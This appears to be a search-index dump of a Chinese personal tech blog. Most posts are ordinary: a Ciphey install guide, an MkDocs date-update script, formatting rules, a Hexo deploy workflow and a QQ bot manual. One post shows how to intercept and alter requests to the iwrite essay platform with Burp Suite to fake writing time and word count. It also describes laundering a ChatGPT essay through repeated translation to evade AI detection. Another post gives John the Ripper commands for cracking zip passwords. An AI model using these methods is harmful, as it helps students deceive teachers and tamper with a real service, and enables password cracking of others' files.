print(sys.version)&quot;\n\n\n\nIf Python is installed, one of these commands will run and will output the version number. Ciphey only supports numbers higher than 3.7. If you see “2” or anything below “3.7”, we’ll need to install a more up to date version.\nMake sure to note what command words. On your computer, if python -c &quot;import sys; print(sys.version)&quot; returns something higher or equal to “3.7”, then whenever you see python3 instead write python.\n⚠️ Windows Warning ⚠️ On Windows? Python defaults to install 32-bit. Ciphey only supports 64-bit. When you download Python from the website on Windows it defaults to 32-bit. Make sure to download 64 bit!\nGo to this website https://www.python.org/ and install Python3. Make sure the version is more than 3.7. By default, unless you explicitly choose a lower version, the version you install will &gt; 3.7.\nNext, we need to install pip.\nPip is already installed by default in Python. We just need to upgrade it.\nOn Linux or Mac OS run the command:\npip3 install -U pip\n\n\n\nMaking sure to replace pip3 with pip if you had to replace python3 with python.\nOn Windows\npython -m pip install -U pip\n\n\n\nIf these commands didn’t work, explore the official Pip guide for upgrading here.\nIf you faced any errors with Pip, there’s a nice troubleshooting guide on installing Pip here.\nInstalling CipheyRun this command:\npython3 -m pip install -U ciphey\n\n\n\nReplace python3 with python if you need to. If you’re not sure, read the previous section Detailed Explanation.\nThis command does many things:\n\nUses Python3 (Ciphey only supports Python3.7 and above)\nThe -m flag tells Python to run the module\nWe are telling the version of pip inside Python3 to install something. The reason why we use Python3 to call Pip instead of calling Pip is that the version of Pip may differ from Python, or you may have multiple versions of Python installed or you may be in a virtual environment.\nThe -U flag says “upgrade”. Sometimes Python gets stuck on an older version of Ciphey, so if it does – it says to upgrade it.\n“ciphey” is the name of the package we want to install.\n\nMake sure you run this command in Terminal&#x2F;CMD&#x2F;PowerShell or whatever you use. Do not run this in Python’s IDLE.\n使用方法\nciphey -t “”\n","categories":["CTF","工具"],"tags":["CTF","Crypto"]},{"title":"关于Mkdocs-material日期显示不准确的一种平替方法","url":"/posts/512a6b20.html","content":"本文另有英文版：https://blog.w1ndys.top/posts/fa88f28c\n注意：更高效的方法：https://github.com/squidfunk/mkdocs-material/discussions/7135#discussioncomment-9277842\n问题背景在一次部署到 Vercel 之后，发现日期显示不准确。我向社区求助，详情可见：https://github.com/squidfunk/mkdocs-material/discussions/6924/，最后发现是 Vercel 并不支持此操作，于是我经过长达两周的测试，找到了一种平替的解决方案\n具体思路就是在每一个 Markdown 文件底部添加一个时间信息的文本，使用 Python 脚本+自动化工作流实现自动更新日期。\n本方案适合：\n\n部署到 Vercel 平台的 material 站点\n文档仓库使用 GitHub\n文档仓库的提交记录与文档内容同步\n\n解决方案Python 脚本import reimport datetimeimport osimport requests# 常量modification_date_pattern = r&#x27;:material-clock-edit-outline:&#123; title=&quot;修改日期&quot; &#125; (\\d&#123;4&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;)&#x27;creation_date_pattern = r&#x27;:material-clock-plus-outline:&#123; title=&quot;创建日期&quot; &#125; (\\d&#123;4&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;)&#x27;# 从代码库中获取文件的创建和更新时间def get_github_file_info(repo_owner, repo_name, file_path, github_token):    api_url = f&quot;https://api.github.com/repos/&#123;repo_owner&#125;/&#123;repo_name&#125;/commits?path=&#123;file_path&#125;&quot;    headers = &#123;&quot;Authorization&quot;: f&quot;token &#123;github_token&#125;&quot;&#125;    response = requests.get(api_url, headers=headers)    if response.status_code == 200:        commits = response.json()        if commits:            create_time = datetime.datetime.fromisoformat(                commits[-1][&quot;commit&quot;][&quot;committer&quot;][&quot;date&quot;].replace(&quot;Z&quot;, &quot;+00:00&quot;)            ).strftime(&quot;%Y-%m-%d&quot;)            update_time = datetime.datetime.fromisoformat(                commits[0][&quot;commit&quot;][&quot;committer&quot;][&quot;date&quot;].replace(&quot;Z&quot;, &quot;+00:00&quot;)            ).strftime(&quot;%Y-%m-%d&quot;)            return create_time, update_time        else:            print(&quot;未找到文件的提交记录：&quot;, file_path)    else:        print(f&quot;错误：&#123;response.status_code&#125; - &#123;response.text&#125;&quot;)    return None, None# 从文档目录中获取文件的相对路径def get_relative_path_from_docs(file_path):    return &quot;docs/&quot; + file_path.split(&quot;docs/&quot;, 1)[-1] if &quot;docs/&quot; in file_path else None# 更新 Markdown 文件的日期信息def update_markdown_files(dir_path, exclude_paths, repo_owner, repo_name, github_token):    for root, dirs, files in os.walk(dir_path):        dirs[:] = [d for d in dirs if os.path.join(root, d) not in exclude_paths]        for file in files:            file_path = os.path.join(root, file)            # 排除不需要更新的文件            if file_path in exclude_paths or not file.endswith(&quot;.md&quot;):                print(f&quot;跳过排除的文件：&#123;file_path&#125;&quot;)                continue            file_path = file_path.replace(&quot;\\\\&quot;, &quot;/&quot;)  # 统一路径分隔符为 /            relative_path = get_relative_path_from_docs(file_path) # 获取文件相对于文档目录的路径            if relative_path is None:                print(f&quot;跳过非文档文件：&#123;file_path&#125;&quot;)                continue            create_time, update_time = get_github_file_info(                repo_owner, repo_name, relative_path, github_token            )            print(&quot;-----------------------------------------------------------&quot;)            print(f&quot;正在处理文件：&#123;relative_path&#125;\\n&quot;)            print(f&quot;创建日期：&#123;create_time&#125;，更新日期：&#123;update_time&#125;\\n&quot;)            # 从代码库中获取 Markdown 文件的日期信息            if create_time is None or update_time is None:                print(f&quot;&#123;file_path&#125; 未找到提交记录，跳过处理&quot;)                continue            with open(file_path, &quot;r+&quot;, encoding=&quot;utf-8&quot;) as f:                lines = f.readlines()                for i, line in enumerate(lines):                    line = line.strip()                    result = re.search(modification_date_pattern, line)                    if result:                        current_date = result.groups(1)[0]                        if current_date == update_time:                            print(f&quot;&#123;file_path&#125; 日期已为最新。&quot;)                            break                        else:                            lines[i] = f&#x27;:material-clock-edit-outline:&#123;&#123; title=&quot;修改日期&quot; &#125;&#125; &#123;update_time&#125;\\n&#x27;                            f.seek(0)                            f.writelines(lines)                            print(f&quot;&#123;file_path&#125; 日期已更新为：&#123;update_time&#125;&quot;)                            break                else:                    lines.append(f&#x27;\\n\\n---\\n\\n:material-clock-edit-outline:&#123;&#123; title=&quot;修改日期&quot; &#125;&#125; &#123;update_time&#125;\\n:material-clock-plus-outline:&#123;&#123; title=&quot;创建日期&quot; &#125;&#125; &#123;create_time&#125;\\n&#x27;)                    f.seek(0)                    f.writelines(lines)                    print(f&quot;&#123;file_path&#125; 未找到日期信息，已添加&quot;)            print(&quot;-----------------------------------------------------------&quot;)if __name__ == &quot;__main__&quot;:    docs_dir = os.path.join(os.getcwd(), &quot;docs&quot;)    # 排除不需要更新的目录或文件    exclude_paths = [        os.path.join(docs_dir, &quot;example_file.md&quot;),        os.path.join(docs_dir, &quot;example_directory&quot;),    ]    repo_owner = &quot;repo_owner&quot; # 修改为代码库所有者    repo_name = &quot;repo_name&quot; # 修改为代码库名称    github_token = os.environ.get(&quot;GITHUB_TOKEN&quot;)    update_markdown_files(docs_dir, exclude_paths, repo_owner, repo_name, github_token)\n\n自动化工作流使用 GitHub Actions 实现自动化部署，并在每次 push 到仓库时，固定时间，以及手动触发时，自动执行脚本。\nname: Update-docson:  push:    branches:      - main # push 时触发  schedule:    - cron: &quot;0 17 * * *&quot; # 每天早上 1 点更新文档 UTC的时间为 17:00 对应的北京时间为 1:00，中国使用东八区时间（UTC+8），因此中国地区的凌晨一点对应的 UTC 时间是前一天的下午17点（即UTC+8 - 8 = UTC）。  workflow_dispatch:permissions:  contents: writejobs:  update-docs:    runs-on: ubuntu-latest    steps:      - name: Checkout Repository        uses: actions/checkout@v2      - name: Set up Python        uses: actions/setup-python@v2        with:          python-version: &quot;3.11.4&quot;      - name: Install dependencies        run: pip install requests      - name: Run Python script        env:          GITHUB_TOKEN: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125;        run: python update-docs.py # 替换成你的脚本名称      - name: Add changes to git        run: |          git add .      - name: Commit and push changes        uses: stefanzweifel/git-auto-commit-action@v4        with:          commit_message: 【bot】自动更新文档日期\n\n注意事项Python 脚本放在 Github 仓库的根目录下，并命名为update-docs.py（命名可以自定义，但是注意在工作流相应位置也需要修改）。\n","categories":["技术教程"],"tags":["Python","Mkdocs","material","Vercel"]},{"title":"公文写作基础知识","url":"/posts/4f542b80.html","content":"公文写作基础知识1.题目：（正标题：三号黑体；副标题：小三号楷体） 2.“摘要”：（五号黑体），摘要内容（楷体五号）3.“关键词”：（五号黑体），关键词内容（五号楷体，多个关键词之间用“；”隔开）。4.正文小四号宋体，标题黑体小四号，正文行间距为1.5倍5.参考文献：（小四号黑体），参考文献内容（五号楷体）。参考文献是作者写作论著时所参考的文献书目。附：参考文献格式要求参考文献格式要求参考文献统一放在文章最后，序号用方括号[1][2][3]……标出，序号左顶格。参照ISO690及ISO690-2，每一参考文献条目的最后均以“.”结束。各类参考文献条目的编排格式及示例如下：a. 专著、论文集、学位论文、报告[序号]主要责任者.文献题名[文献类型标识].出版地：出版者，出版年.起止页码(任选).（中译本前要加国别）[1] [英]M奥康诺尔著，王耀先译．科技书刊的编译工作[M].北京：人民教育出版社，1982.56－57.[2] 辛希孟.信息技术与信息服务国际研讨会论文集：A集[C].北京：中国社会科学出版社，1994.[3] 张筑生.微分半动力系统的不变集[D].北京：北京大学数学系数学研究所，1983.[4] 冯西桥.核反应堆压力管道与压力容器的LBB分析[R].北京：清华大学核能技术设计研究院，1997.b. 期刊文章[序号]主要责任者.文献题名[J].刊名，年，卷(期)：起止页码.[5] 何龄修.读顾城《南明史》[J].中国史研究，1998，(3)：167-173.[6] 金显贺，王昌长，王忠东，等.一种用于在线检测局部放电的数字滤波技术[J].清华大学学报(自然科学版)，1993，33(4)：62-67.c. 论文集中的析出文献[序号]析出文献主要责任者.析出文献题名[A].原文献主要责任者(任选).原文献题名[C].出版地：出版者，出版年.析出文献起止页码.[7] 钟文发.非线性规划在可燃毒物配置中的应用[A].赵玮.运筹学的理论与应用——中国运筹学会第五届大会论文集[C].西安：西安电子科技大学出版社，1996.468-471.d. 报纸文章[序号]主要责任者.文献题名[N].报纸名，出版日期(版次).[8] 谢希德.创造学习的新思路[N].人民日报，1998-12-25(10).e. 国际、国家标准[序号]标准编号，标准名称[S].[9] GB&#x2F;T16159-1996，汉语拼音正词法基本规则[S].f. 专利[序号]专利所有者.专利题名[P].专利国别：专利号，出版日期.[10] 姜锡洲.一种温热外敷药制备方案[P].中国专利：881056073，1989-07-26.g. 电子文献[序号]主要责任者.电子文献题名[电子文献及载体类型标识].电子文献的出处或可获得地址，发表或更新日期&#x2F;引用日期(任选).[11] 王明亮.关于中国学术期刊标准化数据库系统工程的进展[EB&#x2F;OL]. http://www.cajcd.edu.cn/pub/wml.txt/980810-2.html,1998-08-16/1998-10-04.[12] 万锦坤.中国大学学报论文文摘(1983-1993).英文版[DB&#x2F;CD].北京:中国大百科全书出版社，1996.h. 各种未定义类型的文献[序号]主要责任者.文献题名[Z].出版地：出版者，出版年.\nWord文档格式一般为：\n①标题方正小标宋简体    二号  不加粗 居中 段落固定值33磅\n②标题与正文空一行（从正文开始打）\n（空行字体字号与正文保持一致，仿宋三号固定值29磅）\n③正文为仿宋三号不加粗，行间距固定值29磅。首行缩进2字符。两端对齐\n3.标题：与正文缩进等相同、全部用中文字符\n一级标题：黑体三号“一、XXXX”。\n二级标题：楷体三号“（一）XXXX”。\n三级标题：仿宋三号“1.XXXX”。\n四级标题：仿宋三号“（1）XXXX”\n4.Word表格\n①标题方正小标宋简体二号不加粗居中。\n②标题与表格间空一行，表格随内容适当调整。\n③表格全部内容设置单元格格式居中对齐。\n④注意标点。\n⑤两个字的内容或人名中间空两格。\n注：字体根据需要调整，三号，四号或小四。\n5.其他注意点（视图选项）\n①注意符号需为中文符号，区分中英文符号\n如逗号, ， 冒号: ： 破折号- —— 括号( ) （ ）\n②（根据实际情况进行增删）\n","categories":["学习笔记","写作"],"tags":["写作"]},{"title":"利用GithubAction实现Github推送代码后自动同步到服务器(可用于博客、静态页面的自动化更新)","url":"/posts/c0fcf8f3.html","content":"deploy.yml新建工作流文件 .github/workflows/deploy.yml，这里我以 Hexo 的自动化部署为例。\nname: Hexo Deployon:  push:    branches:      - mainenv:  TZ: Asia/Shanghaijobs:  build:    runs-on: ubuntu-latest    steps:      - name: Checkout source        uses: actions/checkout@v2        with:          ref: main      - name: Setup Node.js        uses: actions/setup-node@v1        with:          node-version: &quot;20&quot;      - name: Setup Hexo        env:          ACTION_DEPLOY_KEY: $&#123;&#123; secrets.DEPLOY_KEY &#125;&#125;        run: |          mkdir -p ~/.ssh/          echo &quot;$ACTION_DEPLOY_KEY&quot; | tr -d &#x27;\\r&#x27; &gt; ~/.ssh/id_rsa          chmod 700 ~/.ssh          chmod 600 ~/.ssh/id_rsa          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts          ssh-keyscan gitee.com &gt;&gt; ~/.ssh/known_hosts          git config --global user.email &quot;你的邮箱&quot;          git config --global user.name &quot;你的用户名&quot;          git config --global init.defaultBranch main          npm install hexo-cli -g          npm install      - name: Deploy        run: |          hexo clean          hexo generate          hexo deploy      - name: ECS clone # 连接服务器并克隆        uses: cross-the-world/ssh-pipeline@master        env:          WELCOME: &quot;ssh pipeline&quot;        with:          host: $&#123;&#123; secrets.USER_HOST &#125;&#125; # 服务器的 IP 地址          user: $&#123;&#123; secrets.USER_NAME &#125;&#125; # 服务器的用户名          pass: $&#123;&#123; secrets.USER_PASS &#125;&#125; # 服务器的密码          connect_timeout: 10s          script:            | # 连接服务器并克隆，进入目录并删除旧的文件，移动新的文件，删除.git并修改权限            cd $&#123;&#123; secrets.ECS_SITE &#125;&#125;            git clone --depth 1 -b gh-pages https://ghp.ci/https://github.com/$&#123;&#123; secrets.GH_USERNAME &#125;&#125;/$&#123;&#123; secrets.GH_REPO &#125;&#125;.git            rm -rf index            mv $&#123;&#123; secrets.GH_REPO &#125;&#125; index            cd index            rm -rf .git            chown -R 1000:1000 .\n\n工作流解释这个 GitHub Actions 工作流文件 deploy.yml 主要用于在代码推送到 GitHub 仓库的 main 分支后，自动化部署 Hexo 博客，并将更新同步到服务器。以下是各个步骤的详细解释：\n\n工作流名称和触发条件：\n\nname: Hexo Deploy：定义工作流的名称。\non: push: branches: - main：当代码推送到 main 分支时触发工作流。\n\n\n环境变量：\n\nenv: TZ: Asia/Shanghai：设置时区为上海时间。\n\n\n工作任务：\n\njobs: build: runs-on: ubuntu-latest：定义一个名为 build 的任务，运行在最新的 Ubuntu 环境上。\n\n\n步骤：\n\nsteps:：定义一系列步骤来执行任务。\n\nCheckout 源代码：\n\nname: Checkout source：使用 actions/checkout@v2 操作从 main 分支检出代码。\n\n\n设置 Node.js：\n\nname: Setup Node.js：使用 actions/setup-node@v1 操作设置 Node.js 环境，版本为 20。\n\n\n设置 Hexo：\n\nname: Setup Hexo：配置 Hexo 环境。\nenv: ACTION_DEPLOY_KEY: $&#123;&#123; secrets.DEPLOY_KEY &#125;&#125;：使用 GitHub Secrets 中的 DEPLOY_KEY。\nrun:：执行一系列命令来配置 SSH 密钥、全局 Git 配置和安装 Hexo 及其依赖。\n注意这一步要在脚本中修改自己的邮箱和用户名。\n\n\n部署 Hexo：\n\nname: Deploy：运行 Hexo 部署命令。\nrun:：执行 hexo clean、hexo generate 和 hexo deploy 命令来清理、生成和部署 Hexo 博客。\n\n\n连接服务器并克隆（关键步骤）：\n\nname: ECS clone：使用 cross-the-world/ssh-pipeline@master 操作连接服务器并克隆代码。\nenv: WELCOME: &quot;ssh pipeline&quot;：设置环境变量。\nwith:：提供服务器的 IP 地址、用户名和密码等信息。\nscript:：执行一系列命令来连接服务器、克隆仓库、删除旧文件、移动新文件、删除 .git 目录并修改权限。\ngit clone --depth 1 -b gh-pages https://ghp.ci/https://github.com/$&#123;&#123; secrets.GH_USERNAME &#125;&#125;/$&#123;&#123; secrets.GH_REPO &#125;&#125;.git 这一行是关键，通过克隆分支 gh-pages 来部署静态页面，并且只进行浅层克隆，节省了时间，其中可以根据自己的实际情况进行修改。\n\n\n\n\n\n配置 Secrets\n在仓库的 Settings -&gt; Secrets 中添加以下 Secrets：\n\nUSER_HOST：服务器的 IP 地址\nUSER_NAME：服务器的登录用户名\nUSER_PASS：服务器的登录密码\nECS_SITE：服务器上 Hexo 博客（或其他静态文件）的目录\nGH_USERNAME：GitHub 用户名\nGH_REPO：GitHub 仓库名\nDEPLOY_KEY：用于生成静态文件推送到 GitHub 的 SSH 密钥\n\n特点\n使用 SSH 密钥连接服务器，避免了每次部署时输入密码的麻烦。\n通过 GitHub Actions 实现自动化部署，提高了效率。\n使用 ghp.ci 代理克隆，解决了大陆地区访问 GitHub 慢的问题，并且不需要使用国内 Gitee 等平台进行中转。\n支持多种静态页面部署，如 Hexo、VuePress 等。\n\n","categories":["技术教程","Github"],"tags":["Hexo","GithubAction","自动化部署"]},{"title":"利用Kali中的工具John破解压缩包密码（弱密码","url":"/posts/b63d2e4e.html","content":"推荐一篇文章\nkali中binwalk&#x2F;foremost&#x2F;zip2john工具的配合使用\n第一步拿到hash文件zip2john  [压缩包文件]  &gt;&gt;  [名字.txt]\n\n第二步解析hash文件john  [名字.txt]\n\n另外此处可以指定加密方式\n在Kali系统中我们只需要添加–format&#x3D;[xxx]参数，即可指定John使用指定算法破解密码：\njohn --format=crypt passwd.txt\n\n破解结束后无需再次对相同密文进行破解通常会提示：\n\nLoaded [number] password hashes with [number] different salts (crypt, generic crypt([number]) [?&#x2F;64])No password hashes left to crack (see FAQ)\n\n如果我们需要再次查看破解后的密码只需执行如下命令：\njohn --show passwd.txt\n\n\n\njohn --format=[加密方式] --wordlist=[字典路径] [待解密密文文件]\n\n","categories":["Linux","kali"],"tags":["Linux"]},{"title":"利用burpsuite破解iwrite的写作时间|破解iwrite的AI检测","url":"/posts/4d6a074b.html","content":"如何把“作文很有可能是 AI 生成的”改为“作文非常不可能是由 AI 生成的”？先说方法总结: “谷歌翻译 20 次”\n这边需要注意的是,千万不要用谷歌翻译,因为谷歌翻译的能力太强了,他会很高水平的还原你的作文,导致你无法降低判断出 AI 生成的可能性。直接用百度翻译就可以了。\n下面我以一篇 ChatGPT 生成的作文为例,来说明如何把“作文很有可能是 AI 生成的”改为“作文非常不可能是由 AI 生成的”。\n原文Embarking on a career journey after graduation is akin to stepping into a labyrinth of challenges. Primarily, the lack of experience poses a significant hurdle. Despite theoretical knowledge gained in academia, practical application often demands a different skill set altogether. Moreover, the competitive job market intensifies the pressure, leaving graduates grappling with self-doubt.Financial constraints further exacerbate the situation. With student loans looming overhead and the need to establish oneself independently, the initial phase becomes financially taxing. Consequently, many find themselves compromising on their career aspirations, opting for any available opportunity to make ends meet.Additionally, navigating the professional landscape demands adaptability and resilience. Rejections and setbacks are inevitable, testing one&#x27;s perseverance and determination. Furthermore, striking a balance between personal and professional life adds to the complexity, often leading to burnout.In conclusion, the transition from academia to the professional realm is fraught with multifaceted challenges. However, with perseverance, continuous learning, and a resilient mindset, graduates can overcome these obstacles and carve a fulfilling career path for themselves.\n\n\n翻译成日语卒業後にプロの旅に出ると、挑戦に満ちた迷宮に足を踏み入れるようなものだ。まず、経験不足は重大な障害である。学界で理論知識を得ているにもかかわらず、実際の応用には全く異なる技能が必要になることが多い。また、競争の激しい就職市場は圧力を強め、卒業生を自己不信に陥れている。\n財政規制はさらに情勢を悪化させた。学生ローンが目前に迫っていることや、独立起業の必要性に伴い、最初の段階では財政難になっている。そのため、多くの人は自分がキャリア志向に妥協し、生計を立てるために利用可能な機会を選んでいることに気づいた。\nまた、制御専門分野には適応性と靭性が必要です。拒否と挫折は避けられず、一人の根気と決心が試されている。また、個人生活と職業生活のバランスをとることで複雑さが増し、倦怠感を招くこともあります。\n要するに、学界から専門分野への移行は多方面の挑戦に満ちている。しかし、根気と継続的な学習と強靭な心理状態によって、卒業生はこれらの障害を克服して、自分のために充実した職業の道を切り開くことができます。\n翻译成英语After graduating from a professional trip, it is like stepping into a challenging labyrinth. First, experience shortage is a serious obstacle. Despite theoretical knowledge in the academic world, real applications often require different skills. In addition, competitive job markets intensify pressure and undergraduate graduates.\nFiscal regulation worsened the situation. In the first stage, financial difficulties have been made as the student loan is close at hand and the need for independent entrepreneurship. So many people realized that they chose the opportunity to compromise their career orientation and make a living.\nIn addition, adaptability and toughness are necessary for the field of control. Refusal and failure are inevitable, and one’s patience and determination are being tested. In addition, the balance of personal life and work life increases the complexity, and it sometimes causes fatigue.\nIn short, the transition from academic to professional is full of challenges. But with patience, continuous learning and tough psychological conditions, graduates can overcome these obstacles and open up a profitable career for themselves.\n\n如何用 burpsuite 抓包破解 iwrite 的写作时间？成品\n\n首先你需要两个工具\n时间戳转换工具: https://tool.lu/timestamp/\nburpsuite: https://portswigger.net/burp/download (这里只提供正版不提供学习版)\n\n步骤\n打开 burpsuite,点击菜单栏中的 代理,打开内置浏览器\n\n进入iwrite 官网,登录你的账号\n\n进入写作页面\n写上作文之后(其实可以直接复制,禁用 js 之后直接粘贴,怎么操作可以看我之前的博客)\n一定要出现自动保存的提示,不然不会保存到服务器\n\n\n打开拦截\n\n\n点提交作文\n\n查看请求包\n一开始这个不用管,都是些班级,任务,学生信息之类的东西\n\n把这个包放行\n\n下面这个继续放行\n\n\n修改请求包\n到这里才是需要修改的东西,这里可以看到你写的作文题目和正文\n\n我们需要修改的是时间戳,把它改成以前的时间,这样就能修改你的写作耗时\n&#123;  &quot;studentId&quot;: 908508079,  &quot;source&quot;: 0,  &quot;savePattern&quot;: 0,  &quot;taskId&quot;: 232395,  &quot;title&quot;: &quot;你的作文题目&quot;, // 这里应该是你写的作文题目  &quot;article&quot;: &quot;你的作文数据&quot;, // 这里应该是你写的作文正文  &quot;simpleArticle&quot;: &quot;你的作文数据&quot;, // 这里应该是你写的作文正文  &quot;classId&quot;: 10155377, // 这里应该是你班级的 id  &quot;startTime&quot;: 1713331204412, //这可能是代表的开始写作时间，但实际测试中发现，这个数据无法被利用修改  &quot;words&quot;: 167, // 这里应该是你写的字数  &quot;autoSaveReturnStartTime&quot;: 1713331204413 // 这里是需要修改的时间戳,把他改成以前的时间&#125;\n\n写作耗时的计算公式是：现实的时间-autoSaveReturnStartTime&#x3D;写作耗时\nPS：这里的写作词数也可以改\n进入时间戳转换工具\n我现在的时间是 2024 年 4 月 17 日 13:30:28\n为了更明显一些我改成 2023 年 2023-04-17 13:30:00，对应的时间戳是 1681709400000\n单词数我改成 999\n修改之后放行\n\n继续放行\n\n\n二次修改   \n   这里也要提交，跟之前一样，总共修改两次\n   修改完之后继续发包\n看成品\n","categories":["技术教程"],"tags":["技术教程","iwrite","burpsuite"]},{"title":"卷卷bot使用手册","url":"/posts/fbd9a8fd.html","content":"卷卷 bot\n卷卷 bot 是一个基于 Python 和 NapCatQQ 的 QQ 机器人，由 W1ndys 开发。开源在 W1ndysbot&#x2F;W1ndysbot: 卷卷 bot (github.com)\n使用手册AI 大模型\n开源地址：AI 大模型\n使用方法：群内发送“卷卷+内容”，或“内容+卷卷”，即可使用 AI 大模型提问。\n\n违禁词监控\n开源地址：违禁词监控\n\n\n\n\n命令\n描述\n示例\n\n\n\nbwon\n开启违禁词监控\nbwon\n\n\nbwoff\n关闭违禁词监控\nbwoff\n\n\nbwlist\n查看违禁词列表\nbwlist\n\n\nbwadd+词\n添加违禁词\nbwadd暴力\n\n\nbwrm+词\n删除违禁词\nbwrm暴力\n\n\nvcon\n开启视频监控\nvcon\n\n\nvcoff\n关闭视频监控\nvcoff\n\n\nbanwords\n显示违禁词系统菜单\nbanwords\n\n\n违禁词监控 2（开发中）管理员命令\n\n\n命令\n描述\n示例\n\n\n\nbw2add&lt;词&gt; &lt;权值&gt;\n添加违禁词到指定群的词库\nbw2add暴力 10\n\n\nbw2del&lt;词&gt;\n删除指定群的违禁词\nbw2del暴力\n\n\nbw2defaultadd&lt;词&gt; &lt;权值&gt;\n添加违禁词到默认词库\nbw2defaultadd暴力 10\n\n\nbw2defaultdel&lt;词&gt;\n删除默认违禁词\nbw2defaultdel暴力\n\n\nbw2list\n查看指定群的违禁词列表\nbw2list\n\n\nbw2defaultlist\n查看默认违禁词列表\nbw2defaultlist\n\n\n黑名单系统使用手册\n\n\n命令\n描述\n示例\n\n\n\nbladd\n添加用户到黑名单并踢出群聊。支持使用@或 QQ 号。\nbladd@123456\n\n\nblrm\n从黑名单中移除用户。支持使用@或 QQ 号。\nblrm@123456\n\n\nbllist\n查看当前群的黑名单。\nbllist\n\n\nblcheck\n检查用户是否在黑名单中。支持使用@或 QQ 号。\nblcheck@123456\n\n\nblscan\n扫描群内成员是否在云端黑名单中。\nblscan\n\n\nbltall\n踢出所有在云端黑名单中的群成员。\nbltall\n\n\nblacklist\n显示黑名单系统菜单。\nblacklist\n\n\n黑名单系统\n显示黑名单系统菜单。\n黑名单系统\n\n\n注意: 所有命令均需在群聊中使用，且用户需具备相应权限（群主或管理员）才能执行。\nClassTable 使用手册\n\n\n命令\n描述\n示例\n\n\n\nclasstable 或 课程表\n显示课程表菜单，提供功能说明。\nclasstable 或 课程表\n\n\n查看今日课表 或 今日课表 或 classtabletoday\n查看并发送今日的课程表。\n查看今日课表 或 今日课表 或 classtabletoday\n\n\n取消课程表订阅 或 classtableoff\n取消当前群的课程表订阅，删除对应的课程表文件。\n取消课程表订阅 或 classtableoff\n\n\nWakeUp 课程表分享口令\n导入课程表，需从 WakeUp 课程表 APP 复制分享口令并发送。\n这是来自「WakeUp课程表」的课表分享，...分享口令为「&lt;口令&gt;」\n\n\n使用示例\n查看课程表菜单\n\n输入 classtable 或 课程表，将显示课程表功能的使用说明。\n\n\n查看今日课表\n\n输入 查看今日课表、今日课表 或 classtabletoday，将获取并发送今日的课程表。\n\n\n取消课程表订阅\n\n输入 取消课程表订阅 或 classtableoff，将取消当前群的课程表订阅并删除相关文件。\n\n\n导入课程表\n\n复制 WakeUp 课程表 APP 的分享口令并发送，格式为 这是来自「WakeUp课程表」的课表分享，...分享口令为「&lt;口令&gt;」，系统将自动导入课程表。\n\n\n\n请根据以上命令和示例进行操作。\nCollectTheSun 使用手册以下是 CollectTheSun 项目的命令列表及其示例：\n\n\n\n命令\n描述\n示例\n\n\n\nsunmenu\n显示指令列表\nsunmenu\n\n\n收集阳光\n收集阳光\n收集阳光 或 sun\n\n\n收集雨水\n收集雨水\n收集雨水 或 rain\n\n\n查看信息\n查看自己的信息\n查看信息 或 suninfo\n\n\n查看别人信息\n查看他人信息\n查看信息@ 或 suninfo@\n\n\n加入奇遇\n加入奇遇事件\n加入奇遇 或 sunjoin\n\n\n退出奇遇\n退出奇遇事件\n退出奇遇 或 sunquit\n\n\n阳光榜\n查看阳光排行榜\n阳光榜 或 sunrank\n\n\n雨水榜\n查看雨水排行榜\n雨水榜 或 rainrank\n\n\n偷阳光\n偷取他人阳光\n偷阳光@ 或 stealsun@\n\n\n偷雨水\n偷取他人雨水\n偷雨水@ 或 stealrain@\n\n\n送阳光\n赠送阳光给他人\n送阳光@数量 或 givesun@数量\n\n\n送雨水\n赠送雨水给他人\n送雨水@数量 或 giverain@数量\n\n\nsunadd\n管理员命令，增加阳光\nsunadd [CQ:at,qq=用户ID]数量\n\n\nrainadd\n管理员命令，增加雨水\nrainadd [CQ:at,qq=用户ID]数量\n\n\n\n注意:\n\n@ 表示需要在命令中提及目标用户。\n管理员命令需要拥有相应权限。\n某些命令可能会受到冷却时间的限制。\n\n\n密码工具以下是该程序支持的命令及其使用实例：\n\n\n\n命令\n描述\n示例\n\n\n\nb64d\n解码 Base64\nb64d SGVsbG8gd29ybGQ=\n\n\nb64e\n编码 Base64\nb64e Hello world\n\n\nhash\n计算哈希值\nhash Hello world\n\n\nbin2all\n二进制转其他进制\nbin2all 1010\n\n\noct2all\n八进制转其他进制\noct2all 12\n\n\ndec2all\n十进制转其他进制\ndec2all 10\n\n\nhex2all\n十六进制转其他进制\nhex2all a\n\n\ngenpass\n生成强密码\ngenpass 12 3\n\n\nmd5e\n计算 MD5 编码\nmd5e Hello world\n\n\n注意：\n\ngenpass 命令的格式为 genpass &lt;长度&gt; &lt;复杂度&gt;，其中长度范围为 1-100，复杂度范围为 1-3。\n复杂度等级：\n1: 小写字母和数字\n2: 大小写字母和数字\n3: 大小写字母、数字和标点符号\n\n\n\n群管理\n\n\n命令\n描述\n示例\n\n\n\ngroupmanager\n显示群管理系统菜单\ngroupmanager 或 群管\n\n\nban@ 时间\n禁言指定用户 x 秒，默认 60 秒\nban@ 30\n\n\nunban@\n解除指定用户禁言\nunban@\n\n\nbanme\n随机禁言自己随机秒\nbanme 或 禁言我\n\n\nbanmerank\n查看当日禁言排行\nbanmerank\n\n\nbanrandom\n随机禁言一个群友随机秒\nbanrandom 或 随机禁言\n\n\nbanall\n全员禁言\nbanall\n\n\nunbanall\n全员解禁\nunbanall\n\n\nt@\n踢出指定用户\nt@\n\n\ndel\n撤回消息（需回复要撤回的消息）\ndel\n\n\nvc-on\n开启视频监控\nvc-on\n\n\nvc-off\n关闭视频监控\nvc-off\n\n\nwf-on\n开启欢迎欢送\nwf-on\n\n\nwf-off\n关闭欢迎欢送\nwf-off\n\n\nwf-set\n设置欢迎词\nwf-set\n\n\n测试\n管理员测试命令，返回测试成功\n测试 或 test\n\n\nImageGenerate 使用手册命令列表\n\n\n命令\n描述\n示例命令\n\n\n\n狂粉\n在图片上添加文字 “狂粉”\n狂粉 Hello\n\n\nhand\n在图片上添加文字 “hand”\nhandHello\n\n\n网安邀请函\n在图片上添加文字 “网安邀请函”\n网安邀请函 Hello\n\n\n命令说明\n狂粉:\n\n描述: 在指定的图片上添加文字，文字长度需在 1 到 10 个字符之间。\n示例: 狂粉Hello\n\n\nhand:\n\n描述: 在指定的图片上添加文字，文字长度需在 1 到 10 个字符之间。\n示例: handHello\n\n\n网安邀请函:\n\n描述: 在指定的图片上添加文字，文字长度需在 1 到 6 个字符之间。\n示例: 网安邀请函 